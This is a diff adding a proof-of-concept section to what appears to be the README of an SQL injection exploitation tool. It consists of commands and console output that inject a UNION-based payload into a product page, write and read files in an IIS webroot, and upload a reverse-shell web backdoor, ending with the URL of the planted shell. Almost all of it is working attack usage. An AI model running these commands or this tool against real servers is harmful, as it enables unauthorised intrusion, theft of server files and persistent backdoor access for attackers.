@@ -82,3 +82,41 @@ $ sql_injection -u http://host/view_product.php -H "Agent:roughiz" --data "produ
 $ sql_injection -u http://10.10.10.10:8080/complain/view.php -m GET -H "Agent:roughiz" --data "mod=admin&view=repod&id=plans" -p id  --cookie "PHPSESSID=9cc97jn016e2naklhp4rnj64j0"  --upload-revshell shell_cmd.php  -v 1
 ```
 
+## Poc
+
+```
+$ sql_injection -u http://box/view_product.php -H "X-Forwarded-For:192.168.1.2 Agent:roughiz" --data "productId=1" -p productId  --file-write test.txt --file-dest "C:/Inetpub/wwwroot/uploads/test.txt" --file-read "/Inetpub/wwwroot/cx3iSfa2OwsY.php"  --upload-revshell ./shell_cmd.php
+
+[SQLI] The parameter "productId" is injectable
+[SQLI] Blind injection use code error to analyse injection
+[Exploit] Found a sqli injection: -8408 UNION ALL SELECT CONCAT(0x716a6b6a54,0x57795a66454142,0x5562626b71)#
+[Exploit] The Head: (-8408 UNION ALL SELECT  ) and the comment char: (#)
+[Upload] Upload a file through sqli
+Do you want confirmation that the file 'test.txt' has been successfully written on the backend file system ('C:/Inetpub/wwwroot/uploads/test.txt')?. 'No' by default: [y/n] y
+[Upload] File has been successfully written on the backend 
+[Upload] File verification: the local file "test.txt" and the remote file "C:/Inetpub/wwwroot/uploads/test.txt" have the same size (74 B)
+[Read] The file "/Inetpub/wwwroot/cx3iSfa2OwsY.php" exists and it has the size (74 B)
+[Read] File readed successfully, it will be saved at he path: "/tmp/lJ6iu9Kp__Inetpub_wwwroot_cx3iSfa2OwsY.php" 
+[Reverse Shell Upload] Upload a reverse shell file through sqli
+[INFO] Going to use a web backdoor to establish the tunnel
+which web application language does the web server support?
+[1] ASP
+[2] ASPX
+[3] JSP
+[4] PHP (default)
+>  
+[Reverse Shell Upload] Define destination directory path
+what do you want to use for writable directory?
+[1] Define a locations(s) path(s)
+[2] Brute force search (default)
+> 2
+[Reverse Shell Upload] Define the DBMS server architecture
+Choose the DBMS architecture?
+[1] Windows
+[2] Linux
+[3] All (default)
+> 1
+[Reverse Shell Upload] The script found 1 url(s)
+[URL] Try your reverse shell in the url: http://box/adbVypBUZZ9n.php uploaded in the DBMS path "/Inetpub/wwwroot/adbVypBUZZ9n.php"
+```
+
